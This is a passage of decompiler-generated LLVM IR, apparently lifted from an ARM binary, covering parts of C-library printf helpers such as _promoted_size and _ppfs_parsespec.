  %v0_24200.pre.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_241fc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_241fc.backedge

dec_label_pc_241fc.backedge:                      ; preds = %dec_label_pc_241f8, %dec_label_pc_24128
  %v0_241fc = phi i32 [ %v0_241fc.pre, %dec_label_pc_241f8 ], [ %v0_241fc24, %dec_label_pc_24128 ]
  %v0_24134.be = phi i32 [ %v0_24200.pre.pre, %dec_label_pc_241f8 ], [ %v1_24134, %dec_label_pc_24128 ]
  %v1_241fc = add i32 %v0_241fc, 28
  %v2_241fc = inttoptr i32 %v1_241fc to i32*
  %v3_241fc = load i32, i32* %v2_241fc, align 4
  store i32 %v3_241fc, i32* %r3.global-to-local, align 4
  %v5_24204 = icmp slt i32 %v0_24134.be, %v3_241fc
  br i1 %v5_24204, label %dec_label_pc_24128, label %dec_label_pc_241fc.dec_label_pc_24208.loopexit_crit_edge

dec_label_pc_2420c:                               ; preds = %entry
  br i1 %v6_240d4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_2420c
  %v2_24210 = add i32 %v0_240c0, 36
  %v3_24210 = inttoptr i32 %v2_24210 to i8*
  %v4_24210 = load i8, i8* %v3_24210, align 1
  %v5_24210 = zext i8 %v4_24210 to i32
  %v5_24214 = mul nuw nsw i32 %v5_24210, 8
  %v6_24214 = add i32 %v5_24214, %v0_240c0
  store i32 %v6_24214, i32* %r3.global-to-local, align 4
  %v2_24218 = add i32 %v6_24214, 72
  %v3_24218 = inttoptr i32 %v2_24218 to i32*
  %v4_24218 = load i32, i32* %v3_24218, align 4
  store i32 %v4_24218, i32* %r3.global-to-local, align 4
  store i32 %v4_24218, i32* %v2_240cc, align 4
  %v0_24220.pre = load i32, i32* @r0, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_2420c, %bb
  %v2_24234 = phi i32 [ %v0_24220.pre, %bb ], [ %v0_240c0, %dec_label_pc_2420c ]
  %v1_24220 = add i32 %v2_24234, 4
  %v2_24220 = inttoptr i32 %v1_24220 to i32*
  %v3_24220 = load i32, i32* %v2_24220, align 4
  store i32 %v3_24220, i32* %r3.global-to-local, align 4
  %v6_24224 = icmp eq i32 %v3_24220, -2147483648
  br i1 %v6_24224, label %bb16, label %dec_label_pc_24208

bb16:                                             ; preds = %.thread1
  %v2_24228 = add i32 %v2_24234, 37
  %v3_24228 = inttoptr i32 %v2_24228 to i8*
  %v4_24228 = load i8, i8* %v3_24228, align 1
  %v5_24228 = zext i8 %v4_24228 to i32
  %v5_2422c = mul nuw nsw i32 %v5_24228, 8
  %v6_2422c = add i32 %v5_2422c, %v2_24234
  store i32 %v6_2422c, i32* %r3.global-to-local, align 4
  %v2_24230 = add i32 %v6_2422c, 72
  %v3_24230 = inttoptr i32 %v2_24230 to i32*
  %v4_24230 = load i32, i32* %v3_24230, align 4
  store i32 %v4_24230, i32* %r3.global-to-local, align 4
  store i32 %v4_24230, i32* %v2_24220, align 4
  %v0_24238.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_24208

dec_label_pc_241fc.dec_label_pc_24208.loopexit_crit_edge: ; preds = %dec_label_pc_241fc.backedge
  br label %dec_label_pc_24208.loopexit

dec_label_pc_24208.loopexit:                      ; preds = %dec_label_pc_241fc.dec_label_pc_24208.loopexit_crit_edge, %dec_label_pc_2411c
  %v0_241fc.lcssa = phi i32 [ %v0_241fc, %dec_label_pc_241fc.dec_label_pc_24208.loopexit_crit_edge ], [ %v0_241fc17, %dec_label_pc_2411c ]
  br label %dec_label_pc_24208

dec_label_pc_24208:                               ; preds = %dec_label_pc_24208.loopexit, %.thread1, %bb16
  %v1_24258 = phi i32 [ %v0_241fc.lcssa, %dec_label_pc_24208.loopexit ], [ %v2_24234, %.thread1 ], [ %v0_24238.pre, %bb16 ]
  %v1_24238 = add i32 %v1_24258, 8
  %v2_24238 = inttoptr i32 %v1_24238 to i32*
  %v3_24238 = load i32, i32* %v2_24238, align 4
  store i32 %v3_24238, i32* %r1.global-to-local, align 4
  %v1_2423c = icmp slt i32 %v3_24238, 0
  br i1 %v1_2423c, label %dec_label_pc_24244, label %dec_label_pc_24264

dec_label_pc_24244:                               ; preds = %dec_label_pc_24208
  %v1_24244 = add i32 %v1_24258, 16
  %v2_24244 = inttoptr i32 %v1_24244 to i32*
  %v3_24244 = load i32, i32* %v2_24244, align 4
  %v1_2424c = sub i32 0, %v3_24238
  store i32 %v1_2424c, i32* %r1.global-to-local, align 4
  %v1_24248 = and i32 %v3_24244, -10
  %v1_24250 = or i32 %v1_24248, 8
  store i32 %v1_24250, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_24258 = add i32 %v1_24258, 20
  %v3_24258 = inttoptr i32 %v2_24258 to i32*
  store i32 32, i32* %v3_24258, align 4
  %v0_2425c = load i32, i32* %r1.global-to-local, align 4
  %v1_2425c = load i32, i32* @r0, align 4
  %v2_2425c = add i32 %v1_2425c, 8
  %v3_2425c = inttoptr i32 %v2_2425c to i32*
  store i32 %v0_2425c, i32* %v3_2425c, align 4
  %v0_24260 = load i32, i32* %r3.global-to-local, align 4
  %v1_24260 = load i32, i32* @r0, align 4
  %v2_24260 = add i32 %v1_24260, 16
  %v3_24260 = inttoptr i32 %v2_24260 to i32*
  store i32 %v0_24260, i32* %v3_24260, align 4
  %v1_24268.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_24264

dec_label_pc_24264:                               ; preds = %dec_label_pc_24208, %dec_label_pc_24244
  %v1_24268 = phi i32 [ %v1_24258, %dec_label_pc_24208 ], [ %v1_24268.pre, %dec_label_pc_24244 ]
  %v2_24264 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_24264, i32* @r4, align 4
  ret i32 %v1_24268

; uselistorder directives
  uselistorder i32 %v2_24234, { 1, 0, 2, 3 }
  uselistorder i32 %v0_24134.be, { 1, 0 }
  uselistorder i32 %v0_241fc, { 1, 2, 0 }
  uselistorder i32 %v3_2413c, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_2413c, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_2412c, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v0_2413423, { 1, 0 }
  uselistorder i32 %v0_241fc24, { 0, 2, 1 }
  uselistorder i32 %v0_241fc17, { 2, 0, 1 }
  uselistorder i32 %v0_240c0, { 1, 0, 4, 2, 3, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 17, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder label %dec_label_pc_24264, { 1, 0 }
  uselistorder label %dec_label_pc_24208, { 0, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_241f8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_241e8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_241c8, { 1, 0 }
  uselistorder label %dec_label_pc_241b4, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_24128, { 1, 0 }
  uselistorder label %dec_label_pc_2411c, { 1, 0 }
  uselistorder label %dec_label_pc_240f4, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_2428c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_24288

dec_label_pc_24288:                               ; preds = %dec_label_pc_24294, %entry
  %v0_24288 = phi i32 [ %v1_24288, %dec_label_pc_24294 ], [ add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -37442), %entry ]
  %v1_24288 = add i32 %v0_24288, -2
  %v2_24288 = inttoptr i32 %v1_24288 to i16*
  %v3_24288 = load i16, i16* %v2_24288, align 2
  %v4_24288 = sext i16 %v3_24288 to i32
  store i32 %v1_24288, i32* @ip, align 4
  %v9_2428c = icmp eq i32 %v4_24288, %v1_2428c.pre
  br i1 %v9_2428c, label %dec_label_pc_24288.dec_label_pc_2429c_crit_edge, label %dec_label_pc_24294

dec_label_pc_24288.dec_label_pc_2429c_crit_edge:  ; preds = %dec_label_pc_24288
  br label %dec_label_pc_2429c

dec_label_pc_24294:                               ; preds = %dec_label_pc_24288
  %tmp = icmp ugt i32 %v1_24288, add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -37466)
  br i1 %tmp, label %dec_label_pc_24288, label %dec_label_pc_2429c.loopexit

dec_label_pc_2429c.loopexit:                      ; preds = %dec_label_pc_24294
  br label %dec_label_pc_2429c

dec_label_pc_2429c:                               ; preds = %dec_label_pc_2429c.loopexit, %dec_label_pc_24288.dec_label_pc_2429c_crit_edge
  %v2_242ac.pre-phi = sub i32 %v1_24288, add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -37466)
  store i32 %v2_242ac.pre-phi, i32* @r2, align 4
  %v4_242b0 = sdiv i32 %v2_242ac.pre-phi, 2
  %v5_242b0 = add i32 %v4_242b0, add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -37442)
  %v6_242b0 = inttoptr i32 %v5_242b0 to i8*
  %v7_242b0 = load i8, i8* %v6_242b0, align 1
  %v9_242b0 = zext i8 %v7_242b0 to i32
  ret i32 %v9_242b0

; uselistorder directives
  uselistorder i32 %v2_242ac.pre-phi, { 1, 0 }
  uselistorder i32 %v1_24288, { 1, 0, 3, 4, 2 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -37466), { 1, 0 }
}

define i32 @_ppfs_parsespec(i8* %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp117 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-111 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i8*, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_242c4 = load i32, i32* @r4, align 4
  store i32 %v3_242c4, i32* %stack_var_-36, align 4
  %v6_242c4 = load i32, i32* @r5, align 4
  %v27_242c4 = load i32, i32* @lr, align 4
  %v0_242c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_242c8 = add i32 %v0_242c8, 16
  %v2_242c8 = inttoptr i32 %v1_242c8 to i32*
  %v3_242c8 = load i32, i32* %v2_242c8, align 4
  %v1_242d0 = and i32 %v3_242c8, 128
  store i32 %v1_242d0, i32* @r4, align 4
  %v2_242d0 = icmp eq i32 %v1_242d0, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %v0_242c8, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @lr, align 4
  %v1_242f8 = add i32 %v0_242c8, 24
  %v2_242f8 = inttoptr i32 %v1_242f8 to i32*
  %v3_242f8 = load i32, i32* %v2_242f8, align 4
  store i32 %v3_242f8, i32* %fp.global-to-local, align 4
  br i1 %v2_242d0, label %.dec_label_pc_2434c_crit_edge, label %dec_label_pc_24304

.dec_label_pc_2434c_crit_edge:                    ; preds = %entry
  %v2_242fc = inttoptr i32 %v0_242c8 to i32*
  %v3_242fc = load i32, i32* %v2_242fc, align 4
  store i32 %v3_242fc, i32* %r0.global-to-local, align 4
  %.pre = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_2434c

dec_label_pc_24304:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_24314 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_24308

dec_label_pc_24308:                               ; preds = %dec_label_pc_24338.dec_label_pc_24308_crit_edge, %dec_label_pc_24304
  %v1_24318 = phi i32 [ %v1_24328, %dec_label_pc_24338.dec_label_pc_24308_crit_edge ], [ 0, %dec_label_pc_24304 ]
  %v0_24308 = phi i32 [ %v0_24308.pre, %dec_label_pc_24338.dec_label_pc_24308_crit_edge ], [ %v0_242c8, %dec_label_pc_24304 ]
  %v1_24308 = inttoptr i32 %v0_24308 to i32*
  %v2_24308 = load i32, i32* %v1_24308, align 4
  %v4_2430c = mul i32 %v1_24318, 4
  %v5_2430c = add i32 %v2_24308, %v4_2430c
  store i32 %v5_2430c, i32* %r3.global-to-local, align 4
  %v1_24310 = add i32 %v5_2430c, -4
  %v2_24310 = inttoptr i32 %v1_24310 to i8*
  %v3_24310 = load i8, i8* %v2_24310, align 1
  %v4_24310 = zext i8 %v3_24310 to i32
  store i32 %v4_24310, i32* %r1.global-to-local, align 4
  store i32 %v2_24314, i32* @ip, align 4
  %v2_24318 = add i32 %v1_24318, %v2_24314
  store i32 %v2_24318, i32* %r2.global-to-local, align 4
  %v3_2431c = add i32 %v2_24318, -72
  %v4_2431c = inttoptr i32 %v3_2431c to i8*
  store i8 %v3_24310, i8* %v4_2431c, align 1
  %v0_24320 = load i32, i32* %r3.global-to-local, align 4
  %v1_24320 = add i32 %v0_24320, -4
  %v2_24320 = inttoptr i32 %v1_24320 to i32*
  %v3_24320 = load i32, i32* %v2_24320, align 4
  store i32 %v3_24320, i32* %r3.global-to-local, align 4
  %v0_24324 = load i32, i32* %r1.global-to-local, align 4
  %v9_24324 = icmp eq i32 %v0_24324, %v3_24320
  %v0_24328 = load i32, i32* %r0.global-to-local, align 4
  %v1_24328 = add i32 %v0_24328, 1
  store i32 %v1_24328, i32* %r0.global-to-local, align 4
  br i1 %v9_24324, label %dec_label_pc_24330, label %dec_label_pc_247f4

dec_label_pc_24330:                               ; preds = %dec_label_pc_24308
  %v2_24330 = icmp eq i32 %v3_24320, 0
  br i1 %v2_24330, label %dec_label_pc_24340, label %dec_label_pc_24338

dec_label_pc_24338:                               ; preds = %dec_label_pc_24330
  %tmp182 = icmp ult i32 %v1_24328, 32
  br i1 %tmp182, label %dec_label_pc_24338.dec_label_pc_24308_crit_edge, label %dec_label_pc_24340

dec_label_pc_24338.dec_label_pc_24308_crit_edge:  ; preds = %dec_label_pc_24338
  %v0_24308.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_24308

dec_label_pc_24340:                               ; preds = %dec_label_pc_24338, %dec_label_pc_24330
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_24348 = ptrtoint i32* %stack_var_-111 to i32
  store i32 %v2_24348, i32* %r0.global-to-local, align 4
  %v0_24358.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_2434c

dec_label_pc_2434c:                               ; preds = %.dec_label_pc_2434c_crit_edge, %dec_label_pc_24340
  %v3_24380.pre-phi = phi i32 [ %.pre, %.dec_label_pc_2434c_crit_edge ], [ %v2_24314, %dec_label_pc_24340 ]
  %v0_2437864 = phi i32 [ %v3_242fc, %.dec_label_pc_2434c_crit_edge ], [ %v2_24348, %dec_label_pc_24340 ]
  %v0_24358 = phi i32 [ ptrtoint (i32* @global_var_428d0.3044 to i32), %.dec_label_pc_2434c_crit_edge ], [ %v0_24358.pre, %dec_label_pc_24340 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 360, i32* %r2.global-to-local, align 4
  %v2_24358 = add i32 %v0_24358, -37404
  store i32 %v2_24358, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 -4, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v4_2436c = inttoptr i32 %v2_24358 to i8*
  store i8* %v4_2436c, i8** %stack_var_-120, align 4
  br label %dec_label_pc_24378

dec_label_pc_24374:                               ; preds = %.thread20, %dec_label_pc_244a8
  %v0_24374 = phi i32 [ %v2_24520, %.thread20 ], [ %v0_2448476, %dec_label_pc_244a8 ]
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.3, %.thread20 ], [ %stack_var_-44.2, %dec_label_pc_244a8 ]
  store i32 %v0_24374, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_24378

dec_label_pc_24378:                               ; preds = %dec_label_pc_2434c, %dec_label_pc_24374
  %v1_2438c = phi i32 [ %v0_2437864, %dec_label_pc_2434c ], [ %v0_24374, %dec_label_pc_24374 ]
  %stack_var_-44.1 = phi i32 [ %tmp117, %dec_label_pc_2434c ], [ %stack_var_-44.0, %dec_label_pc_24374 ]
  %v1_24378 = inttoptr i32 %v1_2438c to i8*
  %v2_24378 = load i8, i8* %v1_24378, align 1
  %v3_24378 = zext i8 %v2_24378 to i32
  store i32 %v3_24378, i32* %r3.global-to-local, align 4
  %v7_2437c = icmp eq i8 %v2_24378, 42
  br i1 %v7_2437c, label %bb, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_24378
  store i32 %v1_2438c, i32* %r6.global-to-local, align 4
  %v0_24390 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_24390, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_243d8.preheader

bb:                                               ; preds = %dec_label_pc_24378
  %v1_24384 = load i32, i32* %r8.global-to-local, align 4
  %v2_24384 = load i32, i32* %sb.global-to-local, align 4
  %v4_24384 = mul i32 %v2_24384, %v1_24384
  %v5_24384 = add i32 %v4_24384, %v3_24380.pre-phi
  store i32 %v5_24384, i32* %r3.global-to-local, align 4
  %v2_2438c = add i32 %v1_2438c, 1
  store i32 %v2_2438c, i32* %r6.global-to-local, align 4
  %v0_24390111 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_24390111, i32* %r1.global-to-local, align 4
  %v3_24394 = add i32 %v5_24384, -40
  %v4_24394 = inttoptr i32 %v3_24394 to i32*
  store i32 %v0_24390111, i32* %v4_24394, align 4
  %v0_243dc.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_243d8.preheader

dec_label_pc_243d8.preheader:                     ; preds = %.thread8, %bb
  %v0_243dc.pre = phi i32 [ %v1_2438c, %.thread8 ], [ %v0_243dc.pre.pre, %bb ]
  %v0_243e0.pre = load i32, i32* @lr, align 4
  %v2_243e0 = add i32 %v0_243e0.pre, 360
  %v3_243e0 = inttoptr i32 %v2_243e0 to i32*
  br label %dec_label_pc_243d8

dec_label_pc_2439c:                               ; preds = %dec_label_pc_243d8
  store i32 214748363, i32* %r3.global-to-local, align 4
  %v0_243a0 = load i32, i32* %r1.global-to-local, align 4
  %v2_243a0 = add i32 %v0_243a0, -214748363
  %tmp139 = sub i32 214748362, %v0_243a0
  %v6_243a0 = and i32 %tmp139, %v0_243a0
  %v7_243a0 = icmp slt i32 %v6_243a0, 0
  %v8_243a0 = icmp slt i32 %v2_243a0, 0
  %v9_243a0 = icmp eq i32 %v0_243a0, 214748363
  %v3_243a4 = xor i1 %v8_243a0, %v7_243a0
  %v4_243a4 = or i1 %v9_243a0, %v3_243a4
  br i1 %v4_243a4, label %dec_label_pc_243bc, label %dec_label_pc_243a8

dec_label_pc_243a8:                               ; preds = %dec_label_pc_2439c
  store i32 214748364, i32* %r2.global-to-local, align 4
  %v9_243ac = icmp eq i32 %v0_243a0, 214748364
  br i1 %v9_243ac, label %dec_label_pc_243b4, label %dec_label_pc_243d4

dec_label_pc_243b4:                               ; preds = %dec_label_pc_243a8
  %v8_243b8 = icmp ugt i8 %v2_243dc, 55
  br i1 %v8_243b8, label %dec_label_pc_243d4, label %dec_label_pc_243bc

dec_label_pc_243bc:                               ; preds = %dec_label_pc_243b4, %dec_label_pc_2439c
  %v2_243c0 = mul i32 %v0_243a0, 10
  %v1_243c4 = add i32 %v2_243c0, -48
  store i32 %v1_243c4, i32* %r3.global-to-local, align 4
  %v2_243c8 = add i32 %v1_243c4, %v3_243dc
  br label %dec_label_pc_243d4

dec_label_pc_243d4:                               ; preds = %dec_label_pc_243b4, %dec_label_pc_243a8, %dec_label_pc_243bc
  %storemerge = phi i32 [ %v2_243c8, %dec_label_pc_243bc ], [ 2147483647, %dec_label_pc_243a8 ], [ 2147483647, %dec_label_pc_243b4 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_243d4 = add i32 %v0_2445c, 1
  store i32 %v1_243d4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_243d8

dec_label_pc_243d8:                               ; preds = %dec_label_pc_243d8.preheader, %dec_label_pc_243d4
  %v0_2445c = phi i32 [ %v0_243dc.pre, %dec_label_pc_243d8.preheader ], [ %v1_243d4, %dec_label_pc_243d4 ]
  store i32 360, i32* %r2.global-to-local, align 4
  %v1_243dc = inttoptr i32 %v0_2445c to i8*
  %v2_243dc = load i8, i8* %v1_243dc, align 1
  %v3_243dc = zext i8 %v2_243dc to i32
  store i32 %v3_243dc, i32* @ip, align 4
  %v4_243e0 = load i32, i32* %v3_243e0, align 4
  store i32 %v4_243e0, i32* %r3.global-to-local, align 4
  %v2_243e4 = mul nuw nsw i32 %v3_243dc, 2
  store i32 %v2_243e4, i32* %r2.global-to-local, align 4
  %v2_243e8 = add i32 %v2_243e4, %v4_243e0
  %v3_243e8 = inttoptr i32 %v2_243e8 to i16*
  %v4_243e8 = load i16, i16* %v3_243e8, align 2
  %v6_243e8 = zext i16 %v4_243e8 to i32
  store i32 %v6_243e8, i32* %r3.global-to-local, align 4
  %v1_243ec = and i32 %v6_243e8, 8
  %v2_243ec = icmp eq i32 %v1_243ec, 0
  br i1 %v2_243ec, label %dec_label_pc_243f4, label %dec_label_pc_2439c

dec_label_pc_243f4:                               ; preds = %dec_label_pc_243d8
  %v0_243f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_243f4 = add i32 %v0_243f4, -1
  %v2_243f4 = inttoptr i32 %v1_243f4 to i8*
  %v3_243f4 = load i8, i8* %v2_243f4, align 1
  %v4_243f4 = zext i8 %v3_243f4 to i32
  store i32 %v4_243f4, i32* %r3.global-to-local, align 4
  %v7_243f8 = icmp eq i8 %v3_243f4, 37
  br i1 %v7_243f8, label %dec_label_pc_24400, label %dec_label_pc_244c0

dec_label_pc_24400:                               ; preds = %dec_label_pc_243f4
  %v7_24400 = icmp eq i8 %v2_243dc, 36
  %. = zext i1 %v7_24400 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_2440c = load i32, i32* %r1.global-to-local, align 4
  %tmp143 = icmp slt i32 %v0_2440c, 1
  br i1 %tmp143, label %bb144, label %thread-pre-split

bb144:                                            ; preds = %dec_label_pc_24400
  store i32 0, i32* %r3.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_24400, %bb144
  %v0_24414 = phi i32 [ 0, %bb144 ], [ %., %dec_label_pc_24400 ]
  %v2_24414 = icmp eq i32 %v0_24414, 0
  %v0_24448 = load i32, i32* %fp.global-to-local, align 4
  br i1 %v2_24414, label %dec_label_pc_24448, label %dec_label_pc_2441c

dec_label_pc_2441c:                               ; preds = %thread-pre-split
  %v2_24448 = icmp eq i32 %v0_24448, 0
  %v1_24420 = add i32 %v0_2445c, 1
  store i32 %v1_24420, i32* %r0.global-to-local, align 4
  br i1 %v2_24448, label %dec_label_pc_247f4, label %dec_label_pc_24428

dec_label_pc_24428:                               ; preds = %dec_label_pc_2441c
  %v2_24428 = sub i32 %v0_2440c, %v0_24448
  %v4_24428 = xor i32 %v0_24448, %v0_2440c
  %v5_24428 = xor i32 %v2_24428, %v0_2440c
  %v6_24428 = and i32 %v5_24428, %v4_24428
  %v7_24428 = icmp slt i32 %v6_24428, 0
  %v8_24428 = icmp slt i32 %v2_24428, 0
  %v9_24428 = icmp eq i32 %v0_2440c, %v0_24448
  %v3_2442c = xor i1 %v8_24428, %v7_24428
  %v4_2442c = or i1 %v9_24428, %v3_2442c
  br i1 %v4_2442c, label %dec_label_pc_2443c, label %bb145

bb145:                                            ; preds = %dec_label_pc_24428
  store i32 %v0_2440c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_2443c

dec_label_pc_24438:                               ; preds = %dec_label_pc_2445c, %dec_label_pc_24464
  %v0_24438 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_24438, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_2443c

dec_label_pc_2443c:                               ; preds = %bb145, %dec_label_pc_24428, %dec_label_pc_24438
  %v0_2443c = phi i32 [ %v0_243f4, %dec_label_pc_24438 ], [ %v1_24420, %dec_label_pc_24428 ], [ %v1_24420, %bb145 ]
  %stack_var_-44.2 = phi i32 [ %stack_var_-44.1, %dec_label_pc_24438 ], [ %v0_2440c, %dec_label_pc_24428 ], [ %v0_2440c, %bb145 ]
  store i32 %v0_2443c, i32* %r6.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  %v2_24478.pre = load i8*, i8** %stack_var_-120, align 4
  %v3_24478 = ptrtoint i8* %v2_24478.pre to i32
  br label %dec_label_pc_24478

dec_label_pc_24448:                               ; preds = %thread-pre-split
  %tmp146 = icmp slt i32 %v0_24448, 1
  br i1 %tmp146, label %dec_label_pc_2445c, label %dec_label_pc_24450

dec_label_pc_24450:                               ; preds = %dec_label_pc_24448
  %v7_24450 = icmp eq i8 %v2_243dc, 109
  br i1 %v7_24450, label %dec_label_pc_244c0, label %dec_label_pc_247f4

dec_label_pc_2445c:                               ; preds = %dec_label_pc_24448
  %tmp183 = icmp ugt i32 %v0_2445c, %v0_243f4
  br i1 %tmp183, label %dec_label_pc_24464, label %dec_label_pc_24438

dec_label_pc_24464:                               ; preds = %dec_label_pc_2445c
  %v1_24464 = inttoptr i32 %v0_243f4 to i8*
  %v2_24464 = load i8, i8* %v1_24464, align 1
  %v3_24464 = zext i8 %v2_24464 to i32
  store i32 %v3_24464, i32* %r3.global-to-local, align 4
  %v7_24468 = icmp eq i8 %v2_24464, 48
  br i1 %v7_24468, label %dec_label_pc_24438, label %bb147

bb147:                                            ; preds = %dec_label_pc_24464
  %v1_2446c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_2446c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_244c0

dec_label_pc_24478.loopexit:                      ; preds = %dec_label_pc_24480
  %v1_2448c = load i32, i32* @r4, align 4
  %v3_2448c = or i32 %v1_2448c, %v0_244a0
  store i32 %v3_2448c, i32* @r4, align 4
  %v2_24490 = add i32 %v0_2448476, 1
  store i32 %v2_24490, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_24478

dec_label_pc_24478:                               ; preds = %dec_label_pc_24478.loopexit, %dec_label_pc_2443c
  %v0_2448476 = phi i32 [ %v2_24490, %dec_label_pc_24478.loopexit ], [ %v0_2443c, %dec_label_pc_2443c ]
  store i32 %v3_24478, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_24484 = inttoptr i32 %v0_2448476 to i8*
  br label %dec_label_pc_24480

dec_label_pc_24480:                               ; preds = %dec_label_pc_24498, %dec_label_pc_24478
  %v0_244a0 = phi i32 [ %v2_244a0, %dec_label_pc_24498 ], [ 1, %dec_label_pc_24478 ]
  %v0_24480 = phi i32 [ %v5_24480, %dec_label_pc_24498 ], [ %v3_24478, %dec_label_pc_24478 ]
  %v1_24480 = inttoptr i32 %v0_24480 to i8*
  %v2_24480 = load i8, i8* %v1_24480, align 1
  %v3_24480 = zext i8 %v2_24480 to i32
  store i32 %v3_24480, i32* %r2.global-to-local, align 4
  %v5_24480 = add i32 %v0_24480, 1
  store i32 %v5_24480, i32* %r0.global-to-local, align 4
  %v2_24484 = load i8, i8* %v1_24484, align 1
  %v3_24484 = zext i8 %v2_24484 to i32
  store i32 %v3_24484, i32* %r3.global-to-local, align 4
  %v9_24488 = icmp eq i8 %v2_24484, %v2_24480
  br i1 %v9_24488, label %dec_label_pc_24478.loopexit, label %dec_label_pc_24498

dec_label_pc_24498:                               ; preds = %dec_label_pc_24480
  %v1_24498 = inttoptr i32 %v5_24480 to i8*
  %v2_24498 = load i8, i8* %v1_24498, align 1
  %v3_24498 = zext i8 %v2_24498 to i32
  store i32 %v3_24498, i32* %r3.global-to-local, align 4
  %v2_2449c = icmp eq i8 %v2_24498, 0
  %v2_244a0 = mul i32 %v0_244a0, 2
  store i32 %v2_244a0, i32* %r1.global-to-local, align 4
  br i1 %v2_2449c, label %dec_label_pc_244a8, label %dec_label_pc_24480

dec_label_pc_244a8:                               ; preds = %dec_label_pc_24498
  %v1_244a8 = add i32 %v0_2448476, -1
  %v2_244a8 = inttoptr i32 %v1_244a8 to i8*
  %v3_244a8 = load i8, i8* %v2_244a8, align 1
  %v7_244ac = icmp eq i8 %v3_244a8, 37
  %v0_244b0 = load i32, i32* @r4, align 4
  %v1_244b0 = and i32 %v0_244b0, 10
  store i32 %v1_244b0, i32* %r3.global-to-local, align 4
  %v4_244b4 = udiv i32 %v1_244b0, 2
  %v5_244b4 = sub nuw nsw i32 -1, %v4_244b4
  %v6_244b4 = and i32 %v0_244b0, %v5_244b4
  store i32 %v6_244b4, i32* @r4, align 4
  br i1 %v7_244ac, label %dec_label_pc_244bc, label %dec_label_pc_24374

dec_label_pc_244bc:                               ; preds = %dec_label_pc_244a8
  %v0_244bc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_244bc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_244c0

